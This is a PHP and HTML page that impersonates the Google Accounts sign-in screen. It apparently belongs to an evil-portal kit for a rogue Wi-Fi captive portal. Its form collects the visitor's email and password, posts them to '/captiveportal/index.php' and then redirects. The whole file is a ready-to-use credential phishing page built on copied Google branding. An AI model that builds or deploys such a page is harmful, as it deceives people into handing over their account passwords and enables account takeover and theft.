<?php
$destination = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['HTTP_URI'] . "";
require_once('helper.php');
?>

  <HTML>

  <HEAD>
    <title>Sign in - Google Accounts</title>
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    <meta http-equiv="Pragma" content="no-cache" />
    <meta http-equiv="Expires" content="0" />
    <script type="text/javascript">
      function redirect() {
        setTimeout(function() {
          window.location = "/captiveportal/index.php";
        }, 100);
      }
    </script>
    <meta charset='UTF-8'>
    <meta name="viewport" content="width=device-width, initial-scale=0.75">
    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <script src="jquery-2.2.1.min.js"></script>
    <link rel="icon" type="image/png" href="assets/img/oc3czvmbvf.png"/>
    <style>
    .google-header-bar {
    height: 71px;
    border-bottom: 1px solid #e5e5e5;
    overflow: hidden;
    }

    .google-header-bar.centered {
    border: 0;
    height: 108px;
    }

    .google-header-bar.centered .header .logo {
    float: none;
    margin: 40px auto 30px;
    display: block;
    }
    .google-header-bar.centered .header .secondary-link {
    display: none
    }

    .header .logo {
    margin: 17px 0 0;
    float: left;
    height: 38px;
    width: 116px;
    }
    </style>

    <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
      .google-header-bar.centered {
        height: 83px;
      }

      .google-header-bar.centered .header .logo {
        margin: 25px auto 20px;
      }

      .card {
        margin-bottom: 20px;
      }
    </style>

    <style media="screen and (max-width: 580px)">
      html,
      body {
        font-size: 14px;
      }

      .google-header-bar.centered {
        height: 73px;
      }

      .google-header-bar.centered .header .logo {
        margin: 20px auto 15px;
      }

      .content {
        padding-left: 10px;
        padding-right: 10px;
      }

      .hidden-small {
        display: none;
      }

      .card {
        padding: 20px 15px 30px;
        width: 270px;
      }

      .footer ul li {
        padding-right: 1em;
      }

      .lang-chooser-wrap {
        display: none;
      }
    </style>

  </HEAD>

  <BODY>
    <div class="container">
      <div class="google-header-bar centered">
        <div class="header content clearfix">
          <img alt="Google" class="logo" src="assets/img/logo.png">
        </div>
      </div>
      <h1 class="text-center login-title">Sign in with your Google Account</h1>
      <div class="account-wall">
        <img class="profile-img" src="assets/img/photo.png" alt="">
        <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">
          <input type="hidden" name="target" value="<?=$destination?>">
          <input type="text" name="email" class="form-control" placeholder="Email" required>
          <input type="password" name="password" class="form-control" placeholder="Password" required>
          <br>
          <button class="btn btn-primary btn-block btn-sharp" name="login" type="submit">
            Sign in</button>
          <a href="#" class="pull-right need-help">Find my account </a><span class="clearfix"></span>
        </form>
      </div>
      <br><a href="#" class="text-center new-account">Create an account </a>
      <center><br><p class="tagline">One Google Account for everything Google</p>
      <img src="assets/img/logo_strip.png" width="210" height="17" alt=""></center><br><br>
    </div>
  </BODY>

  </HTML>
